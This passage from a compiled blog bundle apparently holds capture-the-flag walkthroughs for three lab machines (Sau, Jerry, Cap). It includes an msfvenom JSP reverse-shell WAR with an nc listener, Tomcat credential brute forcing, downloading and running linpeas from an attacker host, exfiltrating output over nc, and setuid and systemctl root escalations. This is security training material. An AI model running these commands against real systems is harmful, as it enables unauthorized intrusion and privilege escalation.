also set the LHOST to our host machine, the LPORT is the listen port and is by default 4444.\\n\\nThen we run the exploit by ``run``. And we are in. We run ``shell`` to span a shell and ``whoami`` to see the system user.\\n\\n### Task 8\\n\\nSubmit the flag located in the puma user\'s home directory.\\n\\nWe navigate to the puma user\'s home directory and we list the contents to find and print by ``cat user.txt`` the flag.\\n\\n### Task 9\\n\\nWhat is the full path to the binary (without arguments) the puma user can run as root on Sau?\\n\\nWe can run ``sudo -l`` \\n\\n![alt text](image-13.png)\\n\\nWe then see the full path ``/usr/bin/systemctl``\\n\\n### Task 10\\n\\nWhat is the full version string for the instance of systemd installed on Sau?\\n\\nWe run ``/usr/bin/systemctl --version`` and see the version.\\n\\n``systemd 245 (245.4-4ubuntu3.22)``\\n\\n### Task 11\\n\\nWhat is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?\\n\\nLooking for the CVE ID online we find ``CVE-2023-26604``\\n\\n### Task 12\\n\\nSubmit the flag located in the root user\'s home directory.\\n\\nWe first update the shell by running ``python3 -c \'import pty; pty.spawn(\\"/bin/bash\\")\'``\\n\\nThen we run ``sudo /usr/bin/systemctl status cron.service``\\n\\nand ``!/bin/bash`` to get a shell as root. Then we navigate to the root direcotry and get the flag."},{"id":"/Jerry","metadata":{"permalink":"/Blog/blog/Jerry","editUrl":"https://github.com/danae-pan/Blog/blog/Jerry.md","source":"@site/blog/Jerry.md","title":"Jerry","description":"Task1","date":"2025-04-06T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":3.26,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Jerry","date":"2025-04-06T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"prevItem":{"title":"Sau","permalink":"/Blog/blog/Sau"},"nextItem":{"title":"Cap","permalink":"/Blog/blog/Cap"}},"content":"### Task1\\n\\nWhich TCP port is open on the remote host?\\n\\nRun nmap to scan for ports\\n\\n```nmap -sS -p- <target_ip>```\\n\\n![alt text](image-j.png)\\n\\nAfter scanning, the port 8080 is revelead to be open, where the http-proxy service is running.\\n\\n### Task 2\\n\\nWhich web server is running on the remote host? Looking for two words.\\n\\nTo find the web server, we need to add the version field on the nmap scan.\\n\\n```nmap -sV -p 8080 <target_ip>```\\n\\n![alt text](image-j-1.png)\\n\\nWe see on the version that the web server is **Apache Tomcat**.\\n\\n### Task 3\\n\\nWhich relative path on the webserver leads to the Web Application Manager?\\n\\nOpen a browser and navigate to the ip address of the target. Remember to specify the port to be 8080.\\n\\nTake a look at the page, to see you can find anything useful. Under **Managing Tomcat** you see a URL to **manager webapp** which might be what is refered as Web Application Manager. It is stated that for security, access is restricted and users are defined in **$CATALINA_HOME/conf/tomcat-users.xml**. This seems like an interesting information, but let\'s first see what the URL gets us. When clicking we get redirected to **/manager/html** where we are asked to input our credential. This is a point we should keep in mind, but for now we got the relative path the question is asking for.\\n\\n### Task 4\\n\\nWhat is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password\\n\\nOn the previous step, we navigated to the **/manager/html** were we were asked for credentials. Since we were not able to authenticate, we show an example in the page of how to add a role to a user for accesssing the manager application. We can try to use those example credentials and see if they work on the login prompt, and they do!\\n\\n![alt text](image-j-6.png)\\n\\nAnother approach to this, is using **Metasploit Framework**. First, run ```msfconsole``` and then ```search tomcat```. There you will find the auxiliary **auxiliary/scanner/http/tomcat_mgr_login** which will attempt to login based on a list of username - password names. To use it, run ```use <number_of_option>``` and then to see what you it is required for you to set ```show options```. \\n\\nTo select the target IP address and the port, run ```set RHOSTS <target_ip>``` and ```set RPORT <target_port>```. Then type ```run``` and you will see that a login attempt was succesfull! As seen, those are the same credentials that were found before. \\n\\n![alt text](image-j-7.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 5\\n\\nWhich file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?\\n\\nAfter authenticating in the previous page, you will see this part in the Web Application Manager page:\\n\\n![alt text](image-j-3.png)\\n\\nWe can see that the file type is **WAR**. \\n\\n### Task 6\\n\\nSubmit the flag located on the user\'s desktop.\\n\\nFrom the previous task, we realised we would be able to upload a war file, which smells like a backdoor we could use for remote code execution. A war file is used to deploy java based applications and we can use it to deploy a reverse shell and gain remote access to the target system. \\n\\nWe can generate a war file using msfvenom \\n\\n```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f war > shell.war```\\n\\nAn open the port that was specified so we can listen to the connection from the target\\n\\n```sudo nc -lvnp <your_port>```\\n\\nThen we navigate to the manager page and upload the war payload. \\nOn the list of applications we can see our deployment \\n\\n![alt text](image-j-8.png)\\n\\nThen we can navigate to the **/shell** path and on our temrminal that we opened the port we can see are connected!\\n\\n![alt text](image-j-9.png)\\n\\nNavigating to the directory **\\\\Users\\\\Administrator\\\\Desktop** and lisitng the direcrtories, we find a folder named flags. \\n\\n![alt text](image-j-10.png)\\n\\nRunning ```type \\"2 for the price of 1.txt\\"``` we get both the user and the root flags."},{"id":"/Cap","metadata":{"permalink":"/Blog/blog/Cap","editUrl":"https://github.com/danae-pan/Blog/blog/Cap.md","source":"@site/blog/Cap.md","title":"Cap","description":"Task 1","date":"2025-03-25T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":2.7,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Cap","date":"2025-03-25T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Jerry","permalink":"/Blog/blog/Jerry"}},"content":"### Task 1\\n\\nHow many TCP ports are open?\\n\\n```nmap -sS -p- <ip_address>```\\n\\n- -sS: Stealth Scan, the fastest way to scan ports of the most popular protocol (TCP). \\n\\nAfter scanning, 3 TCP ports are showing to be open.\\n\\n![alt text](image-c.png)\\n\\n### Task 2\\n\\nAfter running a \\"Security Snapshot\\", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?\\n\\nUpen the hamburger menu, and click on **Security Snapshot (5 Second PCAP + Analysis)** \\n\\nThis will redirect you ti a URL with something being **data**. \\n\\n### Task 3\\n\\nAre you able to get to other users\' scans?\\n\\nFor this, you can try and change the **id** from **1** to another value. If you try with the value **0** you will see different dashboard, which means you were able to get to other user\'s scans.\\n\\n### Task 4 \\n\\nWhat is the ID of the PCAP file that contains sensative data?\\n\\nThe page that was found before with the **id** equal to **0** is the one that contains sensative data.\\n\\n### Task 5\\n\\nWhich application layer protocol in the pcap file can the sensetive data be found in?\\n\\nWhen you download and open the file from the dashboard page with **id = 0**, inspect the packets from the Wireshark capture. You will soon find that the sensitive data is in the FTP protocol. Where a request is sent with a password in plain text.\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 6\\n\\nTry to ssh to the target ip address with the user name and the password for you obtained in the previous step. You will see that this will succesfully work. \\n\\n```ssh nathan@<target_ip>```\\n\\n![alt text](image-c-2.png)\\n\\n### Task 7\\n\\nGet the user.txt flag from the ftp server.\\n\\n```wget ftp://user:password@ftp.mydomain.com/path/file.ext```\\n\\n![alt text](image-c-1.png)\\n\\nIn your host run ```cat user.txt``` and obtain the user flag.\\n\\n### Task 8\\n\\nWhat is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?\\n\\nFirst clone the reposiroty for using the Linux escalating privelages script. Then make the script executable.\\n\\n```\\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh\\n\\nchmod +x linpeas.sh\\n\\n```\\n\\nStart a Python HTTP server to transfer the script to the target machine.\\n\\n```python3 -m http.server 8080```\\n\\nOn the target machine, log in with the username **nathan** and his credentials, get the file from your host system.\\n\\n```\\ncd /tmp\\nwget http://<host_ip_address>:8080/linpeas.sh -O linpeas.sh\\nchmod +x linpeas.sh\\n./linpeas.sh\\n```\\n\\nand run it saving the output to a text file.\\n```/tmp/linpeas.sh | tee /tmp/linpeas-output.txt```\\n\\nYou can tranfer this text file to your local machine for further analysis by opening a port to \\"listen\\" to a connection and save the incoming data to a new file locally.\\n\\n```nc -lvnp 4444 > linpeas_output.txt```\\n\\nFrom the target machine you can send the file \\n\\n```cat linpeas_output.txt | nc 10.10.14.190 4444```\\n\\nInspecting the file, under **Files with capabilities** the interesting file is **/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip** which indicates potential privilege escalation allowing changing the user ID to another user (including root)\\n\\n![alt text](image-c-3.png)\\n\\n### Task 9 \\n\\nYou can escalate priveleges and switch to root by attempting\\n\\n ```/usr/bin/python3.8 -c \'import os; os.setuid(0); os.system(\\"/bin/bash\\")\'```\\n\\n then find the flag \\n\\n ```find / -name \\"root.txt\\" 2>/dev/null```\\n\\n and read the flag by \\n```cat /root/root.tx/```"}]}}')}}]);